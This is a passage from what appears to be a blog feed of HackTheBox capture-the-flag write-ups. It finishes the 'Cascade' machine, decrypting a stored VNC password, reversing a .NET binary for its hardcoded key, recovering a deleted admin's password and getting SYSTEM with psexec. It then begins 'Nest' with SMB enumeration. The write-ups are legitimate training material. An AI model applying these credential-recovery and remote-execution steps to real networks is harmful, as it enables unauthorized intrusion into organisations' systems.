</span></span><span class="line"><span class="cl">8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
</span></span><span class="line"><span class="cl">8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
</span></span><span class="line"><span class="cl">8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
</span></span><span class="line"><span class="cl">8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
</span></span></code></pre></div><p>As for <code>dcdiag.log</code>, up until now, I had no idea what that log was about.</p>
<h3 id="shell-as-ssmith">Shell as s.smith</h3>
<h4 id="decrypt-vnc-password">Decrypt VNC Password</h4>
<p>The VNC password can be decrypted using metasploit irb (interactive ruby).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# msfconsole -q
</span></span><span class="line"><span class="cl">msf6 &gt; irb
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting IRB shell...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> You are in the <span class="s2">&#34;framework&#34;</span> object
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">irb: warn: can<span class="s1">&#39;t alias jobs from irb_jobs.
</span></span></span><span class="line"><span class="cl"><span class="s1">&gt;&gt; fixedkey = &#34;\x17\x52\x6b\x06\x23\x4e\x58\x07&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">=&gt; &#34;\x17Rk\x06#NX\a&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">&gt;&gt; require &#39;</span>rex/proto/rfb<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">=&gt; true
</span></span></span><span class="line"><span class="cl"><span class="s1">&gt;&gt; Rex::Proto::RFB::Cipher.decrypt [&#34;6BCF2A4B6E5ACA0f&#34;].pack(&#39;</span>H*<span class="err">&#39;</span><span class="o">)</span>, <span class="nv">fixedkey</span>
</span></span><span class="line"><span class="cl"><span class="o">=</span>&gt; <span class="s2">&#34;sT333ve2&#34;</span>
</span></span></code></pre></div><p>Since it was discovered in <code>s.smith</code>&rsquo;s folder, I will try this decrypted password on user <code>s.smith</code>.</p>
<h4 id="remote-access">Remote Access</h4>
<p>From RPC enumeration, I already knew that user <code>s.smith</code> is a member of Remote Management Users, so I could try it with <code>evil-winrm</code> and it works.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# evil-winrm -i cascade.htb -u s.smith -p <span class="s1">&#39;sT333ve2&#39;</span>
</span></span></code></pre></div><p>I can grab user flag.</p>
<img src="imgs/image-20210423213702788.png" alt="image-20210423213702788" style="zoom:80%;" />
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-arksvc">Shell as arksvc</h3>
<h4 id="audit-share">Audit$ share</h4>
<p>After enumerating <code>s.smith</code>&rsquo;s privileges and groups, <code>CASCADE\Audit Share</code> reminds me to the <code>Audit$</code> share, to which I previously had no access.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>ocuments&gt; whoami /all
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210423214229455.png" alt="image-20210423214229455"  /></div>
</p>
<p>I have read permissions now on <code>Audit$</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# crackmapexec smb cascade.htb -u s.smith -p st333ve2 --shares
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210423214742159.png" alt="image-20210423214742159"  /></div>
</p>
<p>This share appears to contain an entire software application.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# smbclient -U s.smith <span class="se">\\\\</span>cascade.htb<span class="se">\\</span>Audit$
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210423214817145.png" alt="image-20210423214817145"  /></div>
</p>
<p>I&rsquo;ll download them all from Cascade to my Kali.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# smbget -R smb://cascade.htb/Audit$ -U s.smith
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210423215007263.png" alt="image-20210423215007263"  /></div>
</p>
<p>The directory structure of the <code>Audit$</code> share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# tree
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">├── CascAudit.exe
</span></span><span class="line"><span class="cl">├── CascCrypto.dll
</span></span><span class="line"><span class="cl">├── DB
</span></span><span class="line"><span class="cl">│   └── Audit.db
</span></span><span class="line"><span class="cl">├── RunAudit.bat
</span></span><span class="line"><span class="cl">├── System.Data.SQLite.dll
</span></span><span class="line"><span class="cl">├── System.Data.SQLite.EF6.dll
</span></span><span class="line"><span class="cl">├── x64
</span></span><span class="line"><span class="cl">│   └── SQLite.Interop.dll
</span></span><span class="line"><span class="cl">└── x86
</span></span><span class="line"><span class="cl">    └── SQLite.Interop.dll
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">3</span> directories, <span class="m">8</span> files
</span></span></code></pre></div><p>Since this is a Windows program, I will send them over to my Windows.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# file CascAudit.exe
</span></span><span class="line"><span class="cl">CascAudit.exe: PE32 executable <span class="o">(</span>console<span class="o">)</span> Intel <span class="m">80386</span> Mono/.Net assembly, <span class="k">for</span> MS Windows
</span></span></code></pre></div><h4 id="analyzing-auditdb">Analyzing Audit.db</h4>
<p><code>Audit.db</code> is an SQlite3 database. As I&rsquo;m analyzing on my Windows without SQLite installed, I&rsquo;ll use an online <a href="https://inloop.github.io/sqlite-viewer/">SQLite viewer</a>.</p>
<p>There are four tables in the database.</p>
<img src="imgs/image-20210423222130834.png" alt="image-20210423222130834" style="zoom:80%;" />
<p>The records of the deleted AD object are kept in the <code>DeletedUserAudit</code> table.</p>
<img src="imgs/image-20210423221127995.png" alt="image-20210423221127995" style="zoom:80%;" />
<p>The <code>Ldap</code> table contains the credentials for ArkSvc.</p>
<img src="imgs/image-20210423222309586.png" alt="image-20210423222309586" style="zoom:80%;" />
<p>The password is not a simple base64 encoded string, but it is encrypted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# <span class="nb">echo</span> <span class="s1">&#39;BQO5l5Kj9MdErXx6Q6AGOw==&#39;</span> <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl">♣♥□□□□□□D□<span class="p">|</span>zC□♠<span class="p">;</span><span class="c1">#</span>
</span></span></code></pre></div><h4 id="analyzing-cascauditexe">Analyzing CascAudit.exe</h4>
<p>When I run the program, it produces the following errors.</p>
<p><div class="img-container"><img src="imgs/image-20210423223821767.png" alt="image-20210423223821767"  /></div>
</p>
<blockquote>
<p>Don&rsquo;t run an untrusted binary you downloaded from a CTF box.</p>
</blockquote>
<p>I use a tool called <code>dnSpy</code> to reverse CascAudit.exe. Once it is loaded, I will look at the main function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">MyProject</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">CommandLineArgs</span><span class="p">.</span><span class="n">Count</span> <span class="p">!=</span> <span class="m">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Invalid number of command line args specified. Must specify database path only&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span>
</span></span><span class="line"><span class="cl">			<span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="n">sqliteConnection</span><span class="p">.</span><span class="n">Open</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">				<span class="k">using</span> <span class="p">(</span><span class="n">SQLiteCommand</span> <span class="n">sqliteCommand</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SQLiteCommand</span><span class="p">(</span><span class="s">&#34;SELECT * FROM LDAP&#34;</span><span class="p">,</span> <span class="n">sqliteConnection</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">				<span class="p">{</span>
</span></span><span class="line"><span class="cl">					<span class="k">using</span> <span class="p">(</span><span class="n">SQLiteDataReader</span> <span class="n">sqliteDataReader</span> <span class="p">=</span> <span class="n">sqliteCommand</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">					<span class="p">{</span>
</span></span><span class="line"><span class="cl">						<span class="n">sqliteDataReader</span><span class="p">.</span><span class="n">Read</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">						<span class="n">str</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Uname&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">						<span class="n">str2</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Domain&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">						<span class="kt">string</span> <span class="n">encryptedString</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Pwd&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">						<span class="k">try</span>
</span></span><span class="line"><span class="cl">						<span class="p">{</span>
</span></span><span class="line"><span class="cl">							<span class="n">password</span> <span class="p">=</span> <span class="n">Crypto</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="n">encryptedString</span><span class="p">,</span> <span class="s">&#34;c4scadek3y654321&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">						<span class="p">}</span>
</span></span><span class="line"><span class="cl">						<span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">						<span class="p">{</span>
</span></span><span class="line"><span class="cl">							<span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Error decrypting password: &#34;</span> <span class="p">+</span> <span class="n">ex</span><span class="p">.</span><span class="n">Message</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">							<span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">						<span class="p">}</span>
</span></span><span class="line"><span class="cl">					<span class="p">}</span>
</span></span><span class="line"><span class="cl">				<span class="p">}</span>
</span></span><span class="line"><span class="cl">				<span class="n">sqliteConnection</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
</span></span></code></pre></div><p>In order for the program to run properly, I need to specify the database path as its first argument.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">MyProject</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">CommandLineArgs</span><span class="p">.</span><span class="n">Count</span> <span class="p">!=</span> <span class="m">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Invalid number of command line args specified. Must specify database path only&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
</span></span></code></pre></div><p>If the condition above is satisfied, it opens an SQL connection and fetches all data from the <code>Ldap</code> table. Each of them is then stored into <code>str</code>, <code>str2</code>, and <code>password</code> (after Pwd get decrypted).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
</span></span><span class="line"><span class="cl"><span class="n">sqliteConnection</span><span class="p">.</span><span class="n">Open</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="p">(</span><span class="n">SQLiteCommand</span> <span class="n">sqliteCommand</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SQLiteCommand</span><span class="p">(</span><span class="s">&#34;SELECT * FROM LDAP&#34;</span><span class="p">,</span> <span class="n">sqliteConnection</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">using</span> <span class="p">(</span><span class="n">SQLiteDataReader</span> <span class="n">sqliteDataReader</span> <span class="p">=</span> <span class="n">sqliteCommand</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">sqliteDataReader</span><span class="p">.</span><span class="n">Read</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">		<span class="n">str</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Uname&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">		<span class="n">str2</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Domain&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">		<span class="kt">string</span> <span class="n">encryptedString</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Pwd&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">		<span class="k">try</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">password</span> <span class="p">=</span> <span class="n">Crypto</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="n">encryptedString</span><span class="p">,</span> <span class="s">&#34;c4scadek3y654321&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
</span></span></code></pre></div><p>The interesting part in the code above is, of course, the password decrypt line.</p>
<p>Since I only need the decrypt function, I could just remove all the codes and put only this line below on the main function and then print it out using <code>Console.Write()</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="n">password</span> <span class="p">=</span> <span class="n">Crypto</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="n">encryptedString</span><span class="p">,</span> <span class="s">&#34;c4scadek3y654321&#34;</span><span class="p">);</span>
</span></span></code></pre></div><h4 id="decrypt-password">Decrypt Password</h4>
<p>First, I&rsquo;ll enter edit mode on the current main function</p>
<p><div class="img-container"><img src="imgs/image-20210423235935774.png" alt="image-20210423235935774"  /></div>
</p>
<p>Then, I could only use the decrypt function in the main function. So the main function code now looks like this.</p>
<p><div class="img-container"><img src="imgs/image-20210424000216346.png" alt="image-20210424000216346"  /></div>
</p>
<p>I&rsquo;ll save it as a new program called <code>CascAuditModified.exe</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210424000500081.png" alt="image-20210424000500081"  /></div>
</p>
<p>Now if I run it, I get the decrypted password: <code>w3lc0meFr31nd</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210424000707924.png" alt="image-20210424000707924"  /></div>
</p>
<h4 id="remote-access---arksvc">Remote Access - Arksvc</h4>
<p>From my RPC enumeration, ArkSvc is a member of Remote Management Users, so I can use it with <code>evil-winrm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# evil-winrm -i cascade.htb -u arksvc -p <span class="s1">&#39;w3lc0meFr31nd&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.3
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt;
</span></span></code></pre></div><h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\System</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>I&rsquo;ll wrap it up:</p>
<p>First, recall from RPC enumeration that user <code>ArkSvc</code> is also a member of AD Recycle Bin. The AD Recycle Bin group gives you permission to read deleted AD objects.</p>
<p>Second, according to the email sent by Steve Smith, there is a temporary admin account called <code>TempAdmin</code> that uses the same password as the &ldquo;normal&rdquo; admin account.</p>
<p><div class="img-container"><img src="imgs/image-20210424003416214.png" alt="image-20210424003416214"  /></div>
</p>
<p>But, based on <code>ArkAdRecycleBin.log</code>, <code>TempAdmin</code> has been moved into AD Recycle Bin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...[SNIP]...
</span></span><span class="line"><span class="cl">8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
</span></span><span class="line"><span class="cl">8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
</span></span><span class="line"><span class="cl">8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
</span></span><span class="line"><span class="cl">8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
</span></span></code></pre></div><p>And now using <code>ArksSvc</code> account, I can search all the deleted objects using the command below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt; Get-ADObject -filter <span class="s1">&#39;isDeleted -eq $true&#39;</span> -includeDeletedObjects -Properties * -includeDeletedObjects -SearchBase <span class="s2">&#34;DC=cascade,DC=local&#34;</span>
</span></span></code></pre></div><p>After looking through the output, I noticed that <code>TempAdmin</code> has one interesting properties. It is another <code>cascadeLegacyPwd</code>.</p>
<img src="imgs/image-20210424004624882.png" alt="image-20210424004624882" style="zoom:80%;" />
<p>I can decode the value to plaintext</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# <span class="nb">echo</span> <span class="s1">&#39;YmFDVDNyMWFOMDBkbGVz&#39;</span> <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl">baCT3r1aN00dles
</span></span></code></pre></div><p><code>TempAdmin:baCT3r1aN00dles</code></p>
<h4 id="remote-access---nt-authoritysystem">Remote Access - NT Authority\System</h4>
<p>The password works on the Administrator account, and I can obtain an interactive shell as NT Authority\System using <code>psexec.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «cascade» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ psexec.py cascade.local/administrator:<span class="s1">&#39;baCT3r1aN00dles&#39;</span>@cascade.htb
</span></span><span class="line"><span class="cl">Impacket v0.9.20 - Copyright <span class="m">2019</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting shares on cascade.htb.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading file cIaTzKbH.exe
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Opening SVCManager on cascade.htb.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating service UhAX on cascade.htb.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service UhAX.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 6.1.7601<span class="o">]</span>
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2009</span> Microsoft Corporation.  All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;hostname
</span></span><span class="line"><span class="cl">CASC-DC1
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Nest</title>
      <link>https://fahmifj.github.io/hackthebox/nest/</link>
      <pubDate>Tue, 19 May 2020 13:42:14 +0000</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/nest/</guid>
      <description>&lt;p&gt;Nest is one of my favorite machines after Forest, I learned a lot about enumeration here, especially for SMB.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<p>Nest is one of my favorite machines after Forest, I learned a lot about enumeration here, especially for SMB.</p>
<p>The machine starts with anonymous access on SMB, which allows me to obtain credentials of a temporary user. The credentials can be leveraged to read the other shares and obtain an encrypted password. The password can be decrypted with the VB project that is available on the shares.  Further enumeration reveals a password for enabling debug mode of a custom application. With debug mode enabled, I&rsquo;m able to read the application&rsquo;s configuration and obtain encrypted Administrator password. Reversing the application allows me to decrypted the administrator password, which can then be used to gain administrator access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>SMB enumeration</li>
<li>Alternate Data Stream</li>
<li>Reversing .NET</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>smbclient - Preinstalled in Kali Linux</li>
<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> shows two ports open: SMB on port 445, and an unknown service on port 4386, but the fingerprints show it as &lsquo;Reporting Service V1.2&rsquo;.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «nest» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ nmap -p1-5000 -sC -sV -oA nmap/nest 10.10.10.178
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> htb.nest <span class="o">(</span>10.10.10.178<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">445/tcp open  microsoft-ds?
</span></span><span class="line"><span class="cl">4386/tcp open  unknown                                                                                       
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings:                                                                                       
</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Reporting Service V1.2                                                                                 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Reporting Service V1.2
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Unrecognised <span class="nb">command</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Help:          
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Reporting Service V1.2
</span></span><span class="line"><span class="cl"><span class="p">|</span>     This service allows users to run queries against databases using the legacy HQK format
</span></span><span class="line"><span class="cl"><span class="p">|</span>     AVAILABLE COMMANDS ---                  
</span></span><span class="line"><span class="cl"><span class="p">|</span>     LIST   
</span></span><span class="line"><span class="cl"><span class="p">|</span>     SETDIR &lt;Directory_Name&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     RUNQUERY &lt;Query_ID&gt;          
</span></span><span class="line"><span class="cl"><span class="p">|</span>     DEBUG &lt;Password&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    HELP &lt;Command&gt; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: -27s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2020-04-28T15:16:46
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: 2020-04-28T04:20:37
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Anonymous access is allowed here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «nest» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.10.178/
</span></span></code></pre></div><img src="imgs/image-20210416095936362.png" alt="image-20210416095936362" style="zoom:80%;" />
<h4 id="data-share">Data share</h4>
<p>Enumeration on <code>Data</code> share with recurse mode shows two text files.</p>
<img src="imgs/image-20210416095856849.png" alt="image-20210416095856849" style="zoom:80%;" />
<p>One of them is empty while the other one contains credentials for <code>TempUser:Welcome2019</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «smb» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ cat loot/Welcome<span class="se">\ </span>Email.txt
</span></span><span class="line"><span class="cl">We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">You will find your home folder in the following location:
</span></span><span class="line"><span class="cl"><span class="se">\\</span>HTB-NEST<span class="se">\U</span>sers<span class="se">\&lt;</span>USERNAME&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">If you have any issues accessing specific services or workstations, please inform the
</span></span><span class="line"><span class="cl">IT department and use the credentials below <span class="k">until</span> all systems have been <span class="nb">set</span> up <span class="k">for</span> you.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Username: TempUser
</span></span><span class="line"><span class="cl">Password: welcome2019
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Thank you
</span></span><span class="line"><span class="cl">HR
</span></span></code></pre></div><p>With <code>TempUsers</code>, I can access the <code>Secure$</code> share.</p>
<img src="imgs/image-20210416100016140.png" alt="image-20210416100016140" style="zoom:80%;" />
<p>Unfortunately, once I got to <code>Secure$</code> share, I couldn&rsquo;t list any single directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «smb» «192.168.43.234»
</span></span><span class="line"><span class="cl">$  smbclient -U <span class="s1">&#39;TempUser%welcome2019&#39;</span> //10.10.10.178/Secure$ 
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> recurse on
